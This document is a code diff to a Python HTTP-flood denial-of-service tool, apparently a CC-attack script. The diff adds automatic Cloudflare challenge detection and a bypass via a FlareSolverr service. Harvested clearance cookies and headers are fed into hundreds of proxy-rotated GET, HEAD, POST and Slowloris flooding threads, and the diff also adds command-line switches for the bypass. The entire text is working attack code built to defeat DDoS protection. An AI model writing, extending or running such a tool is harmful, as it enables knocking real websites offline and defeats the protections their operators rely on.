@@ -15,6 +15,18 @@ import ssl
 import datetime
 import os
 from collections import defaultdict
+import json
+
+# FlareSolverr配置（添加到全局统计变量后）
+FLARESOLVERR_URL = "http://localhost:8191/v1"
+USE_FLARESOLVERR = False
+flaresolverr_session = None
+flaresolverr_cookies = {}
+flaresolverr_headers = {}
+flaresolverr_lock = threading.Lock()
+session_refresh_interval = 300  # 5分钟刷新一次session
+last_session_time = 0
+
 
 # 全局统计变量
 stats_lock = threading.Lock()
@@ -104,6 +116,7 @@ out_file = "proxy.txt"
 thread_num = 800
 data = ""
 cookies = ""
+full_target_url = ""
 ###############################
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 ###################################################
@@ -126,6 +139,116 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th = threading.Thread(target = head,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
+
+def is_cloudflare_blocked(response_data):
+    """检测是否被Cloudflare拦截"""
+    try:
+        if response_data:
+            response_str = response_data.decode('utf-8', errors='ignore').lower()
+            # 检测Cloudflare特征
+            cf_indicators = [
+                'cloudflare',
+                'cf-ray',
+                'checking your browser',
+                'ddos protection',
+                'security check',
+                'ray id'
+            ]
+            return any(indicator in response_str for indicator in cf_indicators)
+    except:
+        pass
+    return False
+
+def get_cf_cookies_headers():
+    """获取Cloudflare绕过后的cookies和headers"""
+    if not USE_FLARESOLVERR:
+        return "", ""
+    
+    cookies_str = ""
+    headers_str = ""
+    
+    # 构建Cookie字符串
+    if flaresolverr_cookies:
+        cookie_pairs = []
+        for cookie in flaresolverr_cookies:
+            cookie_pairs.append(f"{cookie['name']}={cookie['value']}")
+        cookies_str = "Cookie: " + "; ".join(cookie_pairs) + "\r\n"
+    
+    # 添加重要的CF headers
+    if flaresolverr_headers:
+        for key, value in flaresolverr_headers.items():
+            if key.lower() in ['user-agent', 'accept', 'accept-language']:
+                headers_str += f"{key}: {value}\r\n"
+    
+    return cookies_str, headers_str
+
+
+def init_flaresolverr_session():
+    """初始化FlareSolverr会话"""
+    global flaresolverr_session, flaresolverr_cookies, flaresolverr_headers, last_session_time
+    
+    try:
+        # 创建新会话
+        payload = {
+            "cmd": "sessions.create",
+            "session": f"cc_attack_{int(time.time())}"
+        }
+        
+        response = requests.post(FLARESOLVERR_URL, json=payload, timeout=30)
+        if response.status_code == 200:
+            result = response.json()
+            if result.get('status') == 'ok':
+                flaresolverr_session = result['session']
+                print(f"[FlareSolverr] Session created: {flaresolverr_session}")
+                return True
+    except Exception as e:
+        print(f"[FlareSolverr] Failed to create session: {e}")
+    
+    return False
+
+def solve_cloudflare(url):
+    """使用FlareSolverr解决Cloudflare挑战"""
+    global flaresolverr_session, flaresolverr_cookies, flaresolverr_headers, last_session_time
+    
+    with flaresolverr_lock:
+        current_time = time.time()
+        
+        # 检查是否需要刷新session
+        if current_time - last_session_time > session_refresh_interval:
+            print("[FlareSolverr] Refreshing session...")
+            init_flaresolverr_session()
+            last_session_time = current_time
+        
+        try:
+            payload = {
+                "cmd": "request.get",
+                "url": url,
+                "session": flaresolverr_session,
+                "maxTimeout": 60000
+            }
+            
+            response = requests.post(FLARESOLVERR_URL, json=payload, timeout=65)
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('status') == 'ok':
+                    solution = result.get('solution', {})
+                    flaresolverr_cookies = solution.get('cookies', {})
+                    flaresolverr_headers = solution.get('headers', {})
+                    return True
+        except Exception as e:
+            print(f"[FlareSolverr] Error solving challenge: {e}")
+    
+    return False
+
+def get_flaresolverr_session():
+    """获取FlareSolverr会话信息"""
+    session_dict = {}
+    for cookie in flaresolverr_cookies:
+        session_dict[cookie['name']] = cookie['value']
+    
+    headers = flaresolverr_headers.copy()
+    return session_dict, headers
+
 
 def update_stats_sample(status_code=None, is_error=False):
     """采样统计版本 - 只对部分请求进行详细统计"""
@@ -229,37 +352,100 @@ def randomurl():
 	return str(Intn(0,271400281257))#less random, more performance
 
 def GenReqHeader(method):
-	global data
-	global target
-	global path
-	header = ""
-	if method == "get" or method == "head":
-		connection = "Connection: Keep-Alive\r\n"
-		if cookies != "":
-			connection += "Cookies: "+str(cookies)+"\r\n"
-		accept = Choice(acceptall)
-		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
-		useragent = "User-Agent: " + getuseragent() + "\r\n"
-		header =  referer + useragent + accept + connection + "\r\n"
-	elif method == "post":
-		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
-		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
-		refer = "Referer: http://"+ target + path + "\r\n"
-		user_agent = "User-Agent: " + getuseragent() + "\r\n"
-		accept = Choice(acceptall)
-		if data == "":# You can enable customize data
-			data = str(random._urandom(16))
-		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
-		if cookies != "":
-			length += "Cookies: "+str(cookies)+"\r\n"
-		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
-	return header
+    global data, target, path
+    header = ""
+    
+    # 获取CF绕过信息 (返回的是字符串)
+    cf_cookies_str, cf_headers_str = get_cf_cookies_headers()
+    
+    if method == "get" or method == "head":
+        connection = "Connection: Keep-Alive\r\n"
+        
+        # 处理 Cookies
+        if cf_cookies_str:
+            connection += cf_cookies_str # 已经包含了 "Cookie: ...\r\n"
+        elif cookies:
+            connection += f"Cookie: {cookies}\r\n"
+            
+        # 处理其他 Headers
+        if cf_headers_str:
+            # 如果 FlareSolverr 提供了 headers, 直接使用
+            header = cf_headers_str + connection + "\r\n"
+        else:
+            # 否则, 手动生成
+            referer = f"Referer: {Choice(referers)}{target}{path}\r\n"
+            useragent = f"User-Agent: {getuseragent()}\r\n"
+            accept = Choice(acceptall)
+            header = referer + useragent + accept + connection + "\r\n"
+        
+        return header
+
+    elif method == "post":
+        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
+        
+        # 准备其他 Headers
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
+        refer = f"Referer: http://{target}{path}\r\n"
+        
+        # 准备 POST data
+        post_data = data if data else str(random._urandom(16))
+        length = f"Content-Length: {len(post_data)}\r\nConnection: Keep-Alive\r\n"
+        
+        # 处理 Cookies
+        cookie_header = ""
+        if cf_cookies_str:
+            cookie_header = cf_cookies_str
+        elif cookies:
+            cookie_header = f"Cookie: {cookies}\r\n"
+
+        # 组合所有部分
+        if cf_headers_str:
+            # 如果 FlareSolverr 提供了 headers, 优先使用
+            # 假设 cf_headers_str 已经包含了 User-Agent 等
+            header = post_host + cf_headers_str + content + refer + length + cookie_header + "\r\n" + post_data + "\r\n\r\n"
+        else:
+            # 否则, 手动生成
+            user_agent = f"User-Agent: {getuseragent()}\r\n"
+            accept = Choice(acceptall)
+            header = post_host + accept + refer + content + user_agent + length + cookie_header + "\r\n" + post_data + "\r\n\r\n"
+            
+        return header
+
+def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
+    """处理响应并检测Cloudflare拦截"""
+    global USE_FLARESOLVERR
+    
+    if request_count % SAMPLE_RATE == 0:
+        try:
+            s.settimeout(1)
+            response = s.recv(1024)
+            status_code = parse_response(response)
+            
+            # 检测Cloudflare拦截
+            if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
+                print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
+                USE_FLARESOLVERR = True
+                full_url = f"{protocol}://{target}:{port}{path}"
+                if solve_cloudflare(full_url):
+                    print("[CF绕过] Cloudflare挑战已解决")
+                    return header_gen_func(header_type)  # 重新生成header
+                else:
+                    print("[CF绕过] 解决Cloudflare挑战失败")
+            
+            update_stats_sample(status_code=status_code)
+        except:
+            update_stats_sample(is_error=True)
+    else:
+        update_stats_sample()
+    
+    return None  # 不需要更新header
 
 def ParseUrl(original_url):
 	global target
 	global path
 	global port
 	global protocol
+	global full_target_url
 	original_url = original_url.strip()
 	url = ""
 	path = "/"#default value
@@ -287,6 +473,7 @@ def ParseUrl(original_url):
 	target = check[0]
 	if len(tmp) > 1:
 		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx
+	full_target_url = original_url  # 保存完整URL	
 
 def InputOption(question,options,default):
 	ans = ""
@@ -301,6 +488,7 @@ def InputOption(question,options,default):
 	return ans
 
 def cc(event,proxy_type):
+	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -321,7 +509,7 @@ def cc(event,proxy_type):
 			s.settimeout(3)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(100):
@@ -332,19 +520,9 @@ def cc(event,proxy_type):
 						proxy = Choice(proxies).strip().split(":")
 						update_stats_sample(is_error=True)
 						break
-					
-					# 只对采样的请求进行响应解析
-					if request_count % SAMPLE_RATE == 0:
-						try:
-							s.settimeout(1)  # 设置较短的超时时间
-							response = s.recv(1024)
-							status_code = parse_response(response)
-							update_stats_sample(status_code=status_code)
-						except:
-							update_stats_sample(is_error=True)
-					else:
-						# 非采样请求只做简单计数
-						update_stats_sample()
+					new_header = handle_response_with_cf_detection(s, GenReqHeader, "get")
+					if new_header:
+						header = new_header
 				s.close()
 			except:
 				s.close()
@@ -353,6 +531,7 @@ def cc(event,proxy_type):
 
 
 def head(event,proxy_type):
+	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -372,7 +551,7 @@ def head(event,proxy_type):
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(100):
@@ -383,19 +562,9 @@ def head(event,proxy_type):
 						proxy = Choice(proxies).strip().split(":")
 						update_stats_sample(is_error=True)
 						break
-					
-					# 只对采样的请求进行响应解析
-					if request_count % SAMPLE_RATE == 0:
-						try:
-							s.settimeout(1)
-							response = s.recv(1024)
-							status_code = parse_response(response)
-							update_stats_sample(status_code=status_code)
-						except:
-							update_stats_sample(is_error=True)
-					else:
-						# 非采样请求只做简单计数
-						update_stats_sample()
+					new_header = handle_response_with_cf_detection(s, GenReqHeader, "head")
+					if new_header:
+                        			header = new_header
 				s.close()
 			except:
 				s.close()
@@ -404,6 +573,7 @@ def head(event,proxy_type):
 
 
 def post(event,proxy_type):
+	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
 	request = GenReqHeader("post")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
@@ -420,28 +590,19 @@ def post(event,proxy_type):
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(100):
 					sent = s.send(str.encode(request))
 					if not sent:
-						proxy = Choice(proxies).strip().split(":")
-						update_stats_sample(is_error=True)
-						break
-					
-					# 只对采样的请求进行响应解析
-					if request_count % SAMPLE_RATE == 0:
-						try:
-							s.settimeout(1)
-							response = s.recv(1024)
-							status_code = parse_response(response)
-							update_stats_sample(status_code=status_code)
-						except:
-							update_stats_sample(is_error=True)
-					else:
-						# 非采样请求只做简单计数
-						update_stats_sample()
+					    proxy = Choice(proxies).strip().split(":")
+					    update_stats_sample(is_error=True)
+					    break
+						
+					new_request = handle_response_with_cf_detection(s, GenReqHeader, "post")
+					if new_request:
+						request = new_request
 				s.close()
 			except:
 				s.close()
@@ -464,7 +625,7 @@ if proxy_type == 0:
 			s.settimeout(3)
 			s.connect((str(target), int(port)))
 			if str(port) == '443':
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 				s = ctx.wrap_socket(s,server_hostname=target)
 			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
 			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
@@ -537,7 +698,7 @@ def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
 			s.connect(("1.1.1.1", 80))
 			'''
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 				s = ctx.wrap_socket(s,server_hostname=target)'''
 			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 			if not sent:
@@ -748,6 +909,8 @@ def PrintHelp():
    -s        | set attack time(default:60)
    -down     | download proxies
    -check    | check proxies
+   -cf       | enable Cloudflare bypass (NEW)
+   -fs       | set FlareSolverr URL (NEW)
 =====================================================''')
 
 
@@ -762,6 +925,7 @@ def main():
 	global mode
 	global target
 	global proxies
+	global USE_FLARESOLVERR, FLARESOLVERR_URL
 	target = ""
 	check_proxies = False
 	download_socks = False
@@ -821,6 +985,13 @@ def main():
 			except:
 				print("> -s must be integer")
 				return
+		# 在现有的参数解析循环中添加：
+		if args == '-cf' or args == '--cloudflare':
+		    USE_FLARESOLVERR = True
+		    print("[INFO] Cloudflare bypass enabled via FlareSolverr")
+		if args == '-fs' or args == '--flaresolverr':
+		    FLARESOLVERR_URL = sys.argv[n+1]
+		    print(f"[INFO] FlareSolverr URL set to: {FLARESOLVERR_URL}")			
 
 	if download_socks:
 		DownloadProxies(proxy_ver)
@@ -857,6 +1028,18 @@ def main():
 	build_threads(mode,thread_num,event,proxy_type)
 	event.clear()
 	#input("Press Enter to continue.")
+	# 在 event.set() 之前添加：
+	if USE_FLARESOLVERR:
+	    print("[INFO] Initializing FlareSolverr session...")
+	    if init_flaresolverr_session():
+	        print("[INFO] Solving initial Cloudflare challenge...")
+	        if solve_cloudflare(full_target_url):
+	            print("[SUCCESS] Cloudflare challenge solved!")
+	        else:
+	            print("[WARNING] Failed to solve Cloudflare challenge, continuing anyway...")
+	    else:
+	        print("[ERROR] Failed to initialize FlareSolverr session")
+	        USE_FLARESOLVERR = False
 	event.set()
 	print("> Flooding...")
 	time.sleep(period)
